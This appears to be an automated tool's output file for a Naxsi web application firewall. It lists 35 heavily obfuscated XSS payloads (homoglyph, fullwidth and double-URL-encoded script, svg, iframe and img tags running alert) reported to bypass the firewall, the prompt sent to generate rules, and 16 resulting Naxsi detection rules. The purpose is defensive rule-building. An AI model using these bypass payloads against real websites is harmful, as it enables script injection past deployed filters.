@@ -1,0 +1,246 @@
+{
+    "success": true,
+    "data": {
+        "waf_name": "Naxsi",
+        "existing_rules_count": 46,
+        "enabled_steps": {
+            "clustering": true,
+            "rag": false,
+            "validate_retry": false,
+            "refine": false
+        },
+        "stats": {
+            "total_payloads": 50,
+            "num_bypassed_payloads": 35,
+            "num_clusters": 7,
+            "rules_generated": 16,
+            "rules_valid": 16,
+            "rules_invalid": 0,
+            "rules_fixed": 0,
+            "rules_refined": 16
+        },
+        "clustered_payloads": [
+            {
+                "cluster_id": 3,
+                "payloads": [
+                    "％２５３СѕVg／оnⅬОАD％２５３DAⅼеrt％２５２８１％２５２９％２５３Е",
+                    "％２５３СѕVG／ОnⅬОаD％２５３DАⅼЕRt％２５２８１％２５２９％２５３Е",
+                    "％２５３сѕvg＆＃４７；оnⅼОАD％２５３dаⅬЕRt％２５２８１％２５２９％２５３е",
+                    "％２５３Сѕvg＆＃４７；оnⅼОАD＝аⅬЕrt％２５２８１％２５２９％２５３Е"
+                ],
+                "representative_payload": "％２５３СѕVg／оnⅬОАD％２５３DAⅼеrt％２５２８１％２５２９％２５３Е",
+                "size": 4
+            },
+            {
+                "cluster_id": 4,
+                "payloads": [
+                    "％２５３ｃЅСｒІｐｔ％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；ЅСｒｉPT％２５３ｅ",
+                    "％２５３ｃЅСｒІｐｔ％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；ЅСｒｉPT％２５３ｅ"
+                ],
+                "representative_payload": "％２５３ｃЅСｒІｐｔ％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；ЅСｒｉPT％２５３ｅ",
+                "size": 2
+            },
+            {
+                "cluster_id": 2,
+                "payloads": [
+                    "％２５３Сіfrаmе％２５２０ѕrс％２５３Djаvаѕсrіpt％２５３Ааⅼеrt％２５２８１％２５２９％２５３Е",
+                    "％２５３сіfRАMе％２５２０ѕRС％２５３djАVаЅсRіPt％２５３ааⅬЕrt％２５２８１％２５２９％２５３е",
+                    "％２５３СІFRАMЕ％２５２０ЅRС％２５３DJАVАЅСRІPT％２５３ААⅬЕRT％２５２８１％２５２９％２５３Е",
+                    "％２５３сіfrАmЕ％２５２０Ѕrс％２５３djаvАѕСrіpT％２５３ааⅬеrt％２５２８１％２５２９％２５３Е",
+                    "％２５３сіfRАMе％２５２０ѕRС％２５３DjАvаЅсRіpT％２５３ААⅬЕRT％２５２８１％２５２９％２５３Е",
+                    "％２５３Сіfrаmе％２５２０ЅrС％２５３djАVасrіpt％２５３ааⅬЕrt％２５２８１％２５２９％２５３Е",
+                    "％２５３СІFRаMе％２５２０ЅRс％２５３djАvаѕСrіpT％２５３ааⅼЕRT％２５２８１％２５２９％２５３Е",
+                    "％２５３сІFRАMЕ％２５２０ѕrС％２５３djаVаЅсrіptеrrоr％２５２８１％２５２９％２５３е",
+                    "％２５３сіfRАMе％２５２０ЅRС％２５３djАVаѕсRіpT％２５３aaⅬЕrt％２５２８１％２５２９％２５３Е",
+                    "％２５３СІFRАmе％２５２０ЅRс％２５３DJаVАѕСrіpT％２５３ААⅬЕrt％２５２８１％２５２９％２５３Е"
+                ],
+                "representative_payload": "％２５３Сіfrаmе％２５２０ѕrс％２５３Djаvаѕсrіpt％２５３Ааⅼеrt％２５２８１％２５２９％２５３Е",
+                "size": 10
+            },
+            {
+                "cluster_id": 0,
+                "payloads": [
+                    "％２５３СіfrаMе／％２５２А％２５２１５００００％２５２а／ЅRС％２５３dJАVАѕсRіPT％２５３ааⅼЕRT％２５２８１％２５２９％２５３е＆vѕRᏃ＝Rvww",
+                    "％２５３Сѕvg／оnⅼОАd％２５３DJаvАЅсrіpT％２５３ааⅬеrt％２５２８１％２５２９％２５３Е",
+                    "％２５３сІFRАMЕ％２５２bЅRС％２５３dJАVАЅСRІPT％２５３аАⅬЕRT％２５２８１％２５２９％２５３е",
+                    "％２５３сІFRаMЕ／％２５２А％２５２１５００００％２５２а／ѕrС％２５３DjАvАЅⅬаѕ／％２５２А％２５２１５００００％２５２А／ОNtеХtЕNdЕхT％２５３DｊＡＶａѕＣＲｉｐｔ％２５２８１％２５２９％２５３е",
+                    "％２５３сіfrАMе／％２５２а％２５２１５００００％２５２А／ѕrс％２５３DJаvАЅСrіpT％２５３ААⅬЕrt％２５２８１％２５２９％２５３Е"
+                ],
+                "representative_payload": "％２５３СіfrаMе／％２５２А％２５２１５００００％２５２а／ЅRС％２５３dJАVАѕсRіPT％２５３ааⅼЕRT％２５２８１％２５２９％２５３е＆vѕRᏃ＝Rvww",
+                "size": 5
+            },
+            {
+                "cluster_id": 6,
+                "payloads": [
+                    "％２５３сЅСRІpT％２５３еАⅬЕrt％２５２８１％２５２９％２５３с／ѕсrіPt％２５３е",
+                    "％２５３сѕСRіPt％２５３еаⅼЕrt％２５２８１％２５２９％２５３с／ЅсrіpT％２５３е",
+                    "％２５３сЅСRіPt％２５３еаⅬЕRt％２５２８１％２５２９％２５３с／ѕсRіpT％２５３е",
+                    "％２５３СЅсRіpT％２５３ЕАⅬеrt％２５２８１％２５２９％２５３С／ѕСRіpT％２５３Е",
+                    "％２５３сЅСRіPt％２５３еаⅬЕrt％２５２８１％２５２９％２５３С／ѕСRіPt％２５３Е",
+                    "％２５３СѕсRіPt％２５３ЕАⅼеrt％２５２８１％２５２９％２５３С／ЅСⅬЕtТІNg％２５３Е",
+                    "％２５３СЅсrіpt％２５３Еаⅼеrt％２５２８１％２５２９％２５３С／ѕСRІPT％２５３Е",
+                    "％２５３сѕСrіPt％２５３еаⅬЕRT％２５２８１％２５２９％２５３с／ЅСRІPt％２５３е",
+                    "％２５３сЅСRіPt％２５３еаⅬЕRt％２５２８１％２５２９％２５３С／ѕсRіpT％２５３Е"
+                ],
+                "representative_payload": "％２５３сЅСRІpT％２５３еАⅬЕrt％２５２８１％２５２９％２５３с／ѕсrіPt％２５３е",
+                "size": 9
+            },
+            {
+                "cluster_id": 1,
+                "payloads": [
+                    "％２５３сіMg％２５２０Ѕｒс％２５３ｄХ％２５２０оnЕrrｏr％２５３ｄАⅬｅrt％２５２８１％２５２９％２５３е",
+                    "%２５３ＣiMG%２５２０ｓｒｃ%２５３ＤＸ%２５２０ｏｎｅＲｒｏR%２５３ｄａｌＥｒｔ%２５２８１%２５２９%２５３Ｅ",
+                    "&#60;Svg / OnLOAd&#62;&#60;bODY&#62;"
+                ],
+                "representative_payload": "％２５３сіMg％２５２０Ѕｒс％２５３ｄХ％２５２０оnЕrrｏr％２５３ｄАⅬｅrt％２５２８１％２５２９％２５３е",
+                "size": 3
+            },
+            {
+                "cluster_id": 5,
+                "payloads": [
+                    "％２５３сЅСｒІｐT％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；＄ｕｂｍｉｓｓіоｎ％２５３ｅ",
+                    "％２５３сЅСｒｉｐｔ％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；ЅСｒｉPT％２５３ｅ"
+                ],
+                "representative_payload": "％２５３сЅСｒІｐT％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；＄ｕｂｍｉｓｓіоｎ％２５３ｅ",
+                "size": 2
+            }
+        ],
+        "rag_result": "",
+        "rag_sources": [],
+        "rag_context": "",
+        "generation_prompt": "**CRITICAL SECURITY ALERT**: My WAF has been bypassed during authorized penetration testing.\n\n**Environment:**\n- WAF: Naxsi\n- Bypassed payloads clustered into 7 groups based on similarity and attack pattern:\n\tCluster 3 (4 payloads):\n\t\t％２５３СѕVg／оnⅬОАD％２５３DAⅼеrt％２５２８１％２５２９％２５３Е\n\t\t％２５３СѕVG／ОnⅬОаD％２５３DАⅼЕRt％２５２８１％２５２９％２５３Е\n\t\t％２５３сѕvg＆＃４７；оnⅼОАD％２５３dаⅬЕRt％２５２８１％２５２９％２５３е\n\t\t％２５３Сѕvg＆＃４７；оnⅼОАD＝аⅬЕrt％２５２８１％２５２９％２５３Е\n\tCluster 4 (2 payloads):\n\t\t％２５３ｃЅСｒІｐｔ％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；ЅСｒｉPT％２５３ｅ\n\t\t％２５３ｃЅСｒІｐｔ％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；ЅСｒｉPT％２５３ｅ\n\tCluster 2 (10 payloads):\n\t\t％２５３Сіfrаmе％２５２０ѕrс％２５３Djаvаѕсrіpt％２５３Ааⅼеrt％２５２８１％２５２９％２５３Е\n\t\t％２５３сіfRАMе％２５２０ѕRС％２５３djАVаЅсRіPt％２５３ааⅬЕrt％２５２８１％２５２９％２５３е\n\t\t％２５３СІFRАMЕ％２５２０ЅRС％２５３DJАVАЅСRІPT％２５３ААⅬЕRT％２５２８１％２５２９％２５３Е\n\t\t％２５３сіfrАmЕ％２５２０Ѕrс％２５３djаvАѕСrіpT％２５３ааⅬеrt％２５２８１％２５２９％２５３Е\n\t\t％２５３сіfRАMе％２５２０ѕRС％２５３DjАvаЅсRіpT％２５３ААⅬЕRT％２５２８１％２５２９％２５３Е\n\t\t％２５３Сіfrаmе％２５２０ЅrС％２５３djАVасrіpt％２５３ааⅬЕrt％２５２８１％２５２９％２５３Е\n\t\t％２５３СІFRаMе％２５２０ЅRс％２５３djАvаѕСrіpT％２５３ааⅼЕRT％２５２８１％２５２９％２５３Е\n\t\t％２５３сІFRАMЕ％２５２０ѕrС％２５３djаVаЅсrіptеrrоr％２５２８１％２５２９％２５３е\n\t\t％２５３сіfRАMе％２５２０ЅRС％２５３djАVаѕсRіpT％２５３aaⅬЕrt％２５２８１％２５２９％２５３Е\n\t\t％２５３СІFRАmе％２５２０ЅRс％２５３DJаVАѕСrіpT％２５３ААⅬЕrt％２５２８１％２５２９％２５３Е\n\tCluster 0 (5 payloads):\n\t\t％２５３СіfrаMе／％２５２А％２５２１５００００％２５２а／ЅRС％２５３dJАVАѕсRіPT％２５３ааⅼЕRT％２５２８１％２５２９％２５３е＆vѕRᏃ＝Rvww\n\t\t％２５３Сѕvg／оnⅼОАd％２５３DJаvАЅсrіpT％２５３ааⅬеrt％２５２８１％２５２９％２５３Е\n\t\t％２５３сІFRАMЕ％２５２bЅRС％２５３dJАVАЅСRІPT％２５３аАⅬЕRT％２５２８１％２５２９％２５３е\n\t\t％２５３сІFRаMЕ／％２５２А％２５２１５００００％２５２а／ѕrС％２５３DjАvАЅⅬаѕ／％２５２А％２５２１５００００％２５２А／ОNtеХtЕNdЕхT％２５３DｊＡＶａѕＣＲｉｐｔ％２５２８１％２５２９％２５３е\n\t\t％２５３сіfrАMе／％２５２а％２５２１５００００％２５２А／ѕrс％２５３DJаvАЅСrіpT％２５３ААⅬЕrt％２５２８１％２５２９％２５３Е\n\tCluster 6 (9 payloads):\n\t\t％２５３сЅСRІpT％２５３еАⅬЕrt％２５２８１％２５２９％２５３с／ѕсrіPt％２５３е\n\t\t％２５３сѕСRіPt％２５３еаⅼЕrt％２５２８１％２５２９％２５３с／ЅсrіpT％２５３е\n\t\t％２５３сЅСRіPt％２５３еаⅬЕRt％２５２８１％２５２９％２５３с／ѕсRіpT％２５３е\n\t\t％２５３СЅсRіpT％２５３ЕАⅬеrt％２５２８１％２５２９％２５３С／ѕСRіpT％２５３Е\n\t\t％２５３сЅСRіPt％２５３еаⅬЕrt％２５２８１％２５２９％２５３С／ѕСRіPt％２５３Е\n\t\t％２５３СѕсRіPt％２５３ЕАⅼеrt％２５２８１％２５２９％２５３С／ЅСⅬЕtТІNg％２５３Е\n\t\t％２５３СЅсrіpt％２５３Еаⅼеrt％２５２８１％２５２９％２５３С／ѕСRІPT％２５３Е\n\t\t％２５３сѕСrіPt％２５３еаⅬЕRT％２５２８１％２５２９％２５３с／ЅСRІPt％２５３е\n\t\t％２５３сЅСRіPt％２５３еаⅬЕRt％２５２８１％２５２９％２５３С／ѕсRіpT％２５３Е\n\tCluster 1 (3 payloads):\n\t\t％２５３сіMg％２５２０Ѕｒс％２５３ｄХ％２５２０оnЕrrｏr％２５３ｄАⅬｅrt％２５２８１％２５２９％２５３е\n\t\t%２５３ＣiMG%２５２０ｓｒｃ%２５３ＤＸ%２５２０ｏｎｅＲｒｏR%２５３ｄａｌＥｒｔ%２５２８１%２５２９%２５３Ｅ\n\t\t&#60;Svg / OnLOAd&#62;&#60;bODY&#62;\n\tCluster 5 (2 payloads):\n\t\t％２５３сЅСｒІｐT％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；＄ｕｂｍｉｓｓіоｎ％２５３ｅ\n\t\t％２５３сЅСｒｉｐｔ％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；ЅСｒｉPT％２５３ｅ\n\n\nGenerate PRODUCTION-GRADE defense rules to block these clusters of payloads, following these requirements:\n\n1. **Multi-Layer Detection**: Create rules that detect:\n   - Raw pattern matching (regex)\n   - Normalized/decoded variants (URL decoding, Unicode normalization)\n   - Obfuscation techniques (comment injection, case variations)\n   - Anomaly patterns (unusual character sequences, excessive encoding)\n\n2. **Rule Requirements**:\n   - Match both obvious and obfuscated forms\n   - Include pre-processing steps (normalize, decode, lowercase)\n   - Minimize false positives with negative lookaheads\n   - Specify rule severity and recommended action (BLOCK/LOG/CHALLENGE)\n\n3. **Coverage Strategy**: Generalize patterns to catch variants without overfitting to specific payloads.\n\n4. **Target WAF Guardrails**:\n**Naxsi-Specific Constraints**:\n- Output Naxsi syntax only.\n- DO NOT output ModSecurity syntax such as SecRule, SecAction, ctl, t:, phase:, deny, id inside quoted action lists, or chained ModSecurity directives.\n- Prefer native Naxsi directives only: MainRule, BasicRule, CheckRule.\n- MainRule should use Naxsi-native components like rx:/str:/d:, msg:, mz:, s:, id:...;\n- BasicRule should use wl:... and mz:... only.\n- CheckRule should use Naxsi threshold syntax only.\n- For detection rules, include the Naxsi-native essentials: pattern (`rx:` or `str:`), match zone (`mz:`), score (`s:`), and unique `id:`.\n- Example rule:\n   MainRule \"rx:pattern\" \"msg:Description\" \"mz:BODY|URL|ARGS\" \"s:$XSS:8\" id:100001;\n- End each Naxsi rule with ';'.\n- Before outputting, self-check that no ModSecurity keywords or ModSecurity action syntax appear anywhere in the output.\n\n5. **Mandatory Self-Check Before Final Output**:\n   - Verify the syntax belongs to the target WAF only.\n   - Verify no unsupported transformation, operator, or directive is present.\n   - If a desired normalization step is unsupported by the target WAF, replace it with the closest supported alternative instead of inventing a new syntax.\n   - Prefer a simpler valid rule over a more advanced but potentially invalid rule.\n\n6. **Multi-Layer URL Encoding**: When generating rules, always account for multi-layer URL encoding by applying repeated URL-decoding transformations, e.g. t:urlDecodeUni multiple times, so payloads encoded two or more times such as %25253C...%25253E are normalized before regex matching.\n\nThe WAF format instruction will follow — generate rules ONLY in that specified format.\n\n---\n**KNOWLEDGE BASE REFERENCES FOR RULE GENERATION**\n\n\n\n---\nUse the references above as implementation evidence for writing WAF rules.\nPrioritize WAF-specific syntax, fields, operators, transformations, actions, and concrete examples.\nIgnore references that only describe the attack generally but do not help write a rule.\nPrioritize the specific bypassed payloads mentioned above.\n",
+        "generated_rules": [
+            {
+                "rule": "MainRule \"str:%25\" \"msg:Possible multi-layer encoding used in XSS bypass attempts\" \"mz:URL|ARGS|BODY\" \"s:$XSS:2\" id:110001;",
+                "instructions": "Layer 1 anomaly rule. In Naxsi, repeated URL decoding is not available as a transformation primitive, so detect dense percent-encoding as a precursor signal. Pair with the stricter signature rules below and threshold using CheckRule."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:%25[0-9a-f]{2}){3,}\" \"msg:Nested percent-encoding sequence typical of obfuscated payloads\" \"mz:URL|ARGS|BODY\" \"s:$XSS:6\" id:110002;",
+                "instructions": "Layer 1 anomaly rule for double/triple-encoded input. Helps surface payloads like %25253c... without relying on unsupported decode transforms. Keep score moderate to avoid false positives from benign encoded blobs unless combined with script/tag indicators."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:&#(?:x0*2f|0*47);|%2f|/)[[:space:]]*(?:script|svg|iframe)\" \"msg:Encoded or raw closing/opening tag separator with active content tag\" \"mz:URL|ARGS|BODY\" \"s:$XSS:7\" id:110003;",
+                "instructions": "Catches slash obfuscation used in encoded closing tags and tag construction. Generalized for script/svg/iframe. Intended to catch variants using &#47; and mixed encoding around tag boundaries."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:<|%3c|%253c|&#0*60;|&#x0*3c;)[[:space:]]*(?:script|svg|iframe|img|body)\\b\" \"msg:Active HTML tag introduction including encoded variants\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110004;",
+                "instructions": "Primary raw/encoded tag detector. Covers clusters using script, svg, iframe, img, and body. This is the main generalized signature for tag-based XSS payload families."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:script|svg|img|body)\\b[^\\n\\r]{0,64}\\bon(?:load|error)\\b\" \"msg:Event handler near active HTML tag\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110005;",
+                "instructions": "Behavioral/signature hybrid. Detects event handler attachment such as onload/onerror close to tag names. Helps catch cluster 1 and 3 style payloads even when tag delimiters vary."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)\\bon(?:load|error|readystatechange|mouseover|focus|begin|animationstart)\\b[[:space:]]*(?:=|%3d|%253d)\" \"msg:Encoded or raw event handler assignment\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110006;",
+                "instructions": "Generalized event-handler assignment rule. Includes encoded equals signs seen in the payloads. Broader than only onload/onerror to prevent trivial variant swaps."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)\\b(?:src|href|data|action)\\b[[:space:]]*(?:=|%3d|%253d)[[:space:]]*(?:javascript|vbscript|data)\\s*:\" \"msg:Scriptable URI scheme in attribute assignment\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110007;",
+                "instructions": "Targets iframe/img/script attribute abuse using javascript: and similar schemes. Critical for cluster 0 and 2. Restricting to attribute names reduces false positives."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:javascript|vbscript)\\s*:[^\\n\\r]{0,48}\\b(?:alert|prompt|confirm|eval)\\s*(?:\\(|%28|%2528)\" \"msg:Script URI followed by executable sink\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110008;",
+                "instructions": "Detects executable script URI payloads leading to common JS sinks. Tuned to the observed alert(1) family but generalized to prompt/confirm/eval."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)\\balert\\s*(?:\\(|%28|%2528)[[:space:]]*[0-9'\\\"a-z_.$-]{0,16}[[:space:]]*(?:\\)|%29|%2529)\" \"msg:JavaScript alert sink invocation\" \"mz:URL|ARGS|BODY\" \"s:$XSS:6\" id:110009;",
+                "instructions": "Secondary sink detector. Useful when tag/context signatures and nested-encoding anomaly combine. Score is lower to limit false positives in benign text mentioning alert()."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:<|%3c|%253c|&#0*60;|&#x0*3c;)[^\\n\\r]{0,32}(?:script|svg|iframe|img|body)[^\\n\\r]{0,128}(?:>|%3e|%253e|&#0*62;|&#x0*3e;)\" \"msg:Complete active tag construction with encoded delimiters\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110010;",
+                "instructions": "Catches full tag assembly even when delimiters are encoded. Helps cover mixed forms seen across clusters 1, 3, 4, 5, and 6."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:<|%3c|%253c|&#0*60;|&#x0*3c;)[[:space:]]*/[[:space:]]*(?:script|svg|iframe|body)\\b\" \"msg:Closing active HTML tag including encoded opening bracket\" \"mz:URL|ARGS|BODY\" \"s:$XSS:7\" id:110011;",
+                "instructions": "Detects closing tags for active elements, including mixed raw/encoded forms such as </script> and &#60;/script. Useful for script wrapper payloads in clusters 4, 5, and 6."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:script|svg|iframe|img)\\b[^\\n\\r]{0,96}(?:%25[0-9a-f]{2}){2,}\" \"msg:Active tag token combined with nested encoding anomaly\" \"mz:URL|ARGS|BODY\" \"s:$XSS:7\" id:110012;",
+                "instructions": "Correlation-style signature for active content words plus suspicious encoding density in nearby bytes. Useful when payloads are partially normalized before reaching Naxsi."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)&#(?:x0*3c|0*60);[[:space:]]*(?:svg|script|iframe|img|body)\\b\" \"msg:HTML entity encoded active tag start\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110013;",
+                "instructions": "Specifically catches entity-encoded tag starts such as &#60;Svg. Added because one tested payload used entity encoding rather than percent-encoding."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)\\b(?:svg|img|iframe|body)\\b[^\\n\\r]{0,96}\\bon(?:load|error)\\b[^\\n\\r]{0,32}\\b(?:alert|prompt|confirm|eval)\\b\" \"msg:High-confidence tag-event-sink XSS pattern\" \"mz:URL|ARGS|BODY\" \"s:$XSS:9\" id:110014;",
+                "instructions": "High-confidence composite signature. This is intended to block strongly when a dangerous tag, an event handler, and a JavaScript sink appear close together."
+            },
+            {
+                "rule": "CheckRule \"$XSS >= 8\" BLOCK;",
+                "instructions": "Primary enforcement threshold. Blocks high-confidence matches from any single strong rule or multiple weaker correlated rules."
+            },
+            {
+                "rule": "CheckRule \"$XSS >= 5\" BLOCK;",
+                "instructions": "Use only if your traffic profile is already known and false positives are low. Recommended for applications with no legitimate HTML/script-bearing input. Otherwise keep disabled or replace operationally with monitoring outside Naxsi."
+            }
+        ],
+        "fixed_rules": [],
+        "final_rules": [
+            {
+                "rule": "MainRule \"str:%25\" \"msg:Possible multi-layer encoding used in XSS bypass attempts\" \"mz:URL|ARGS|BODY\" \"s:$XSS:2\" id:110001;",
+                "instructions": "Layer 1 anomaly rule. In Naxsi, repeated URL decoding is not available as a transformation primitive, so detect dense percent-encoding as a precursor signal. Pair with the stricter signature rules below and threshold using CheckRule."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:%25[0-9a-f]{2}){3,}\" \"msg:Nested percent-encoding sequence typical of obfuscated payloads\" \"mz:URL|ARGS|BODY\" \"s:$XSS:6\" id:110002;",
+                "instructions": "Layer 1 anomaly rule for double/triple-encoded input. Helps surface payloads like %25253c... without relying on unsupported decode transforms. Keep score moderate to avoid false positives from benign encoded blobs unless combined with script/tag indicators."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:&#(?:x0*2f|0*47);|%2f|/)[[:space:]]*(?:script|svg|iframe)\" \"msg:Encoded or raw closing/opening tag separator with active content tag\" \"mz:URL|ARGS|BODY\" \"s:$XSS:7\" id:110003;",
+                "instructions": "Catches slash obfuscation used in encoded closing tags and tag construction. Generalized for script/svg/iframe. Intended to catch variants using &#47; and mixed encoding around tag boundaries."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:<|%3c|%253c|&#0*60;|&#x0*3c;)[[:space:]]*(?:script|svg|iframe|img|body)\\b\" \"msg:Active HTML tag introduction including encoded variants\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110004;",
+                "instructions": "Primary raw/encoded tag detector. Covers clusters using script, svg, iframe, img, and body. This is the main generalized signature for tag-based XSS payload families."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:script|svg|img|body)\\b[^\\n\\r]{0,64}\\bon(?:load|error)\\b\" \"msg:Event handler near active HTML tag\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110005;",
+                "instructions": "Behavioral/signature hybrid. Detects event handler attachment such as onload/onerror close to tag names. Helps catch cluster 1 and 3 style payloads even when tag delimiters vary."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)\\bon(?:load|error|readystatechange|mouseover|focus|begin|animationstart)\\b[[:space:]]*(?:=|%3d|%253d)\" \"msg:Encoded or raw event handler assignment\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110006;",
+                "instructions": "Generalized event-handler assignment rule. Includes encoded equals signs seen in the payloads. Broader than only onload/onerror to prevent trivial variant swaps."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)\\b(?:src|href|data|action)\\b[[:space:]]*(?:=|%3d|%253d)[[:space:]]*(?:javascript|vbscript|data)\\s*:\" \"msg:Scriptable URI scheme in attribute assignment\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110007;",
+                "instructions": "Targets iframe/img/script attribute abuse using javascript: and similar schemes. Critical for cluster 0 and 2. Restricting to attribute names reduces false positives."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:javascript|vbscript)\\s*:[^\\n\\r]{0,48}\\b(?:alert|prompt|confirm|eval)\\s*(?:\\(|%28|%2528)\" \"msg:Script URI followed by executable sink\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110008;",
+                "instructions": "Detects executable script URI payloads leading to common JS sinks. Tuned to the observed alert(1) family but generalized to prompt/confirm/eval."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)\\balert\\s*(?:\\(|%28|%2528)[[:space:]]*[0-9'\\\"a-z_.$-]{0,16}[[:space:]]*(?:\\)|%29|%2529)\" \"msg:JavaScript alert sink invocation\" \"mz:URL|ARGS|BODY\" \"s:$XSS:6\" id:110009;",
+                "instructions": "Secondary sink detector. Useful when tag/context signatures and nested-encoding anomaly combine. Score is lower to limit false positives in benign text mentioning alert()."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:<|%3c|%253c|&#0*60;|&#x0*3c;)[^\\n\\r]{0,32}(?:script|svg|iframe|img|body)[^\\n\\r]{0,128}(?:>|%3e|%253e|&#0*62;|&#x0*3e;)\" \"msg:Complete active tag construction with encoded delimiters\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110010;",
+                "instructions": "Catches full tag assembly even when delimiters are encoded. Helps cover mixed forms seen across clusters 1, 3, 4, 5, and 6."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:<|%3c|%253c|&#0*60;|&#x0*3c;)[[:space:]]*/[[:space:]]*(?:script|svg|iframe|body)\\b\" \"msg:Closing active HTML tag including encoded opening bracket\" \"mz:URL|ARGS|BODY\" \"s:$XSS:7\" id:110011;",
+                "instructions": "Detects closing tags for active elements, including mixed raw/encoded forms such as </script> and &#60;/script. Useful for script wrapper payloads in clusters 4, 5, and 6."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)(?:script|svg|iframe|img)\\b[^\\n\\r]{0,96}(?:%25[0-9a-f]{2}){2,}\" \"msg:Active tag token combined with nested encoding anomaly\" \"mz:URL|ARGS|BODY\" \"s:$XSS:7\" id:110012;",
+                "instructions": "Correlation-style signature for active content words plus suspicious encoding density in nearby bytes. Useful when payloads are partially normalized before reaching Naxsi."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)&#(?:x0*3c|0*60);[[:space:]]*(?:svg|script|iframe|img|body)\\b\" \"msg:HTML entity encoded active tag start\" \"mz:URL|ARGS|BODY\" \"s:$XSS:8\" id:110013;",
+                "instructions": "Specifically catches entity-encoded tag starts such as &#60;Svg. Added because one tested payload used entity encoding rather than percent-encoding."
+            },
+            {
+                "rule": "MainRule \"rx:(?i)\\b(?:svg|img|iframe|body)\\b[^\\n\\r]{0,96}\\bon(?:load|error)\\b[^\\n\\r]{0,32}\\b(?:alert|prompt|confirm|eval)\\b\" \"msg:High-confidence tag-event-sink XSS pattern\" \"mz:URL|ARGS|BODY\" \"s:$XSS:9\" id:110014;",
+                "instructions": "High-confidence composite signature. This is intended to block strongly when a dangerous tag, an event handler, and a JavaScript sink appear close together."
+            },
+            {
+                "rule": "CheckRule \"$XSS >= 8\" BLOCK;",
+                "instructions": "Primary enforcement threshold. Blocks high-confidence matches from any single strong rule or multiple weaker correlated rules."
+            },
+            {
+                "rule": "CheckRule \"$XSS >= 5\" BLOCK;",
+                "instructions": "Use only if your traffic profile is already known and false positives are low. Recommended for applications with no legitimate HTML/script-bearing input. Otherwise keep disabled or replace operationally with monitoring outside Naxsi."
+            }
+        ]
+    }
+}
